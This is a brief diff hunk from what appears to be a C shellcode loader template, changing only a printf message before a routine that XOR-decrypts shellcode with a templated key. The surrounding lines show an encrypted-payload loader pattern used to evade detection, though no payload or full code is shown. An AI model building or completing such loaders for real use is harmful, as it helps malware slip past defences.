@@ -231,7 +231,7 @@ int main( int argc, char* argv[] ) {
 
 	printf( "[+] OK: Address %p\n", lpBaseAddress );
 
-	printf( "[-] Beginning decryption routine" );
+	printf( "[-] Beginning decryption routine. \n" );
 
 	xorShellcode( shellcode, shellcode_size, "${ KEY }" );
 
